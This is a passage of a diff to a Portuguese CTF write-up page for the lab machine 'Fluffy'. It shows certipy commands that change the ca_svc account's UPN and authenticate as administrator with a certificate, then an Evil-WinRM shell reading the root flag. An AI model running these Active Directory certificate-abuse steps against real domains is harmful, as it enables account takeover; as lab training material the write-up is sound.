+                  href="mailto:ca_svc@fluffy.htb">ca_svc@fluffy.htb</a></a>.</p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
 └─# certipy -debug account -username &#39;ca_svc&#39; -hashes &#39;:hash&#39; -dc-ip 10.129.164.91 -ns 10.129.164.91 /
 -target DC01.fluffy.htb -upn &#39;ca_svc@fluffy.htb&#39; -user &#39;ca_svc&#39; update       
 
@@ -726,9 +727,10 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Updating user &#39;ca_svc&#39;:
     userPrincipalName                   : ca_svc@fluffy.htb
 [*] Successfully updated &#39;ca_svc&#39;</code></pre>
-                <p><code>[0x0539] &gt;</code> obtendo a hash do
-                administrator e obtendo a flag r00t!</p>
-                <pre class="bash"><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
+                  <p><code>[0x0539] &gt;</code> obtendo a hash do
+                  <code>administrator</code> e obtendo a flag
+                  <code>r00t</code>!</p>
+                  <pre><code>┌──(root㉿kali)-[~/windows/ctf/fluffy]
 └─# certipy auth -pfx administrator.pfx -domain fluffy.htb -dc-ip 10.129.164.91
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
@@ -755,10 +757,11 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ../desktop/root.txt
 1337_ROOT_:|
 *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </code></pre>
-                <p>Terminamos mais uma máquina espero que tenha
-                aprendido algo nessa sala, nos vemos nas próximas!</p>
+                  <p>Terminamos mais uma máquina, espero que tenha
+                  aprendido algo nessa sala.<br />
+                  Nos vemos nas próximas!</p>
             </article>
-
+            
             <a href="../../index.html" class="back-link">← Voltar para a página principal</a>
         </main>
 
@@ -767,9 +770,6 @@ Info: Establishing connection to remote endpoint
                 <span>&copy; 2025 - pwnbuffer.org </span>
                 <span class="footer-separator">|</span>
                 <a href="https://x.com/pwnbff" target="_blank" class="footer-link">[ X ] </a>
-                <span class="footer-separator">|</span>
-                <a href="../../a/wallpapers.html" target="_blank" class="footer-link">[ Wallpapers ] </a>
-
         </footer>
     </div>
 
